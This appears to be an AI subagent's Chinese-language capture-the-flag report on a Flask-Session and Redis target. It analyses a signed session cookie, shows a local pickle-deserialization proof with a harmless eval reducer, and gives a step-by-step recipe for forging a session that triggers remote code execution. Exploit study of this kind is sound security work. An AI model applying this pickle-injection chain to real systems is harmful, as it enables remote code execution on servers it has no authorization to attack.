## Branch Result
direction: session-blackbox
subagent_id: branch_002
status: INFEASIBLE

### 发现

- Cookie 实例为：
  `3acb0294-63e8-4bc3-b29d-ea83b24ca836.Xy40lRLeQcUj59eQHvjuFwUAT6U`。
  前半段是标准 UUIDv4，后半段为 27 个 Base64URL 字符，解码后恰为 20
  字节，符合 itsdangerous `Signer` 默认 HMAC-SHA1 签名。
- 登录成功后多次请求的 SID 和签名保持不变，只刷新 Expires。这不是 Flask
  默认的客户端 JSON session，而是签名的服务端 session ID。
- Cookie 的外形和行为与旧版 Flask-Session（实测对照 0.3.2 源码）完全吻合：
  `_generate_sid()` 返回 `str(uuid4())`；签名器为
  `Signer(app.secret_key, salt='flask-session', key_derivation='hmac')`。
  注意 salt 是 `flask-session`，不是 Flask 默认客户端 Cookie 使用的
  `cookie-session`，也不是 `session`。
- 认证后页面包含注释 `<!--没错就是这么简洁~Red*s-->`，结合题目名称和
  Flask-Session 行为，强指向 Redis session 后端。旧版
  `RedisSessionInterface.open_session()` 的关键链为：
  `signer.unsign(cookie) -> redis.get('session:' + sid) ->
  pickle.loads(value)`。默认 Redis key prefix 是 `session:`。
- 对有效 Cookie、改一位签名、去掉签名、替换 UUID、添加第三段分别请求：
  只有原 Cookie 恢复 `Welcome,cx73194`；所有畸形值都被拒绝并签发全新的
  UUID Cookie，返回登录页。说明 pickle 字节不在 Cookie 中，且反序列化发生
  在成功验签并取得后端记录之后。
- 常见 Redis 端口 6379、16379、26379 均为 closed-or-filtered，只有 80
  可连接；未发现可从外部直接写 Redis 的入口。
- 本地安全等价链验证成功：用完全相同的 Signer 参数签名 UUID，在模拟 Redis
  的 `session:<UUID>` 中放置 protocol 0 pickle；无害 reducer
  `eval("40+2")` 在 `pickle.loads` 时执行，所得 session 为
  `{'_permanent': True, 'probe': 42}`。pickle 指令中确认存在
  `GLOBAL '__builtin__ eval'` 和 `REDUCE`。
- 因此“反序列化触发链”是成立的，但“仅靠伪造 Cookie 即 RCE”不成立。
  远程利用同时需要：
  1. `SECRET_KEY`，用于生成通过验证的 SID Cookie；
  2. Redis 写入原语，向 `session:<sid>` 写入攻击者构造的原始 pickle。
  当前 session-blackbox 分支未获得二者，且按要求没有暴力破解密钥。

### 命令和结果

1. Cookie 后缀长度与摘要长度：

```bash
python3 - <<'PY'
import base64
s='Xy40lRLeQcUj59eQHvjuFwUAT6U'
print(len(s), len(base64.urlsafe_b64decode(s+'=')),
      base64.urlsafe_b64decode(s+'=').hex())
PY
```

输出：

```text
27 20 5f2e349512de41c523e7d7901ef8ee1705004fa5
```

2. Cookie 差分请求摘要：

```text
valid:    HTTP 200, Set-Cookie 保持原 SID, Welcome,cx73194
badsig:   HTTP 200, Set-Cookie=新 UUID.签名, Deserialization Login
unsigned: HTTP 200, Set-Cookie=新 UUID.签名, Deserialization Login
badsid:   HTTP 200, Set-Cookie=新 UUID.签名, Deserialization Login
extra:    HTTP 200, Set-Cookie=新 UUID.签名, Deserialization Login
```

其中 badsig 只把签名最后一字符从 `U` 改为 `A`；badsid 保留原签名但把
UUID 改为全零。两者均被拒绝。

3. Flask-Session 0.3.2 源码对照（从 PyPI wheel 只读提取）：

```python
def _generate_sid(self):
    return str(uuid4())

def _get_signer(self, app):
    return Signer(app.secret_key, salt='flask-session',
                  key_derivation='hmac')

# RedisSessionInterface.open_session
sid_as_bytes = signer.unsign(sid)
sid = sid_as_bytes.decode()
val = self.redis.get(self.key_prefix + sid)
data = self.serializer.loads(val)  # serializer = pickle
```

默认配置源码同时给出：

```text
SESSION_KEY_PREFIX = 'session:'
SESSION_TYPE == 'redis' -> RedisSessionInterface(...)
```

4. 页面 Redis 线索：

```bash
rg -n '<!--|Red' /tmp/manual_web_authed_home.txt
```

输出：

```text
35:<!--没错就是这么简洁~Red*s-->
```

5. 精确端口 connect 探测（无范围扫描）：

```text
80 open
6379 closed-or-filtered
16379 closed-or-filtered
26379 closed-or-filtered
```

6. 本地安全触发验证的核心构造：

```python
import pickle
from itsdangerous import Signer

SECRET = b'local-proof-only'
SID = '11111111-2222-4333-8444-555555555555'

class BenignProbe:
    def __reduce__(self):
        return (eval, ('40+2',))

blob = pickle.dumps(
    {'_permanent': True, 'probe': BenignProbe()}, protocol=0
)
redis_value = {'session:' + SID: blob}
signer = Signer(
    SECRET, salt='flask-session', key_derivation='hmac'
)
cookie = signer.sign(SID.encode()).decode()
unsigned_sid = signer.unsign(cookie).decode()
loaded = pickle.loads(redis_value['session:' + unsigned_sid])
```

输出：

```text
cookie = 11111111-2222-4333-8444-555555555555.qoDXQLbO78VR7JEV15SW5XhM2m4
redis_key = session:11111111-2222-4333-8444-555555555555
pickle_len = 76
loaded = {'_permanent': True, 'probe': 42}
probe_executed = True
dangerous_opcodes:
35 GLOBAL '__builtin__ eval'
70 REDUCE None
```

### 结论

当前分支为 **INFEASIBLE**：已安全验证旧版 Flask-Session + Redis +
pickle 的反序列化触发链，但不能从当前黑盒 Cookie 单独完成远程触发。HMAC
不能从已知 SID/签名对逆推出 `SECRET_KEY`，而签名 Cookie 只选择 Redis key，
不承载 pickle 数据；此外常见 Redis 端口没有外部写入面。

如果其他分支取得 `SECRET_KEY` 和 Redis 写入能力，具体构造如下：

1. 生成新的 UUIDv4 `sid`。
2. 构造最终必须反序列化成 mapping/dict 的 pickle；安全确认时使用上述
   `BenignProbe`，实际 CTF 利用时才将 reducer 换成所需的受控动作。
3. 将原始 pickle 字节写入 Redis 键 `session:<sid>`，TTL 可按应用两小时
   session 生命周期设置。
4. 生成 Cookie：
   `Signer(SECRET_KEY, salt='flask-session',
   key_derivation='hmac').sign(sid.encode()).decode()`。
5. 携带该 `session` Cookie 请求 `/`。应用验签、读取 Redis 后，会在路由处理
   前的 `open_session()` 中执行 `pickle.loads`。

后续建议优先寻找源码/配置泄露以取得 `SECRET_KEY`，以及 SSRF、Redis 协议注入
或其他后端写入原语；不要继续在 Cookie payload 上尝试直接塞 pickle，也不要
对 `SECRET_KEY` 做暴力破解。
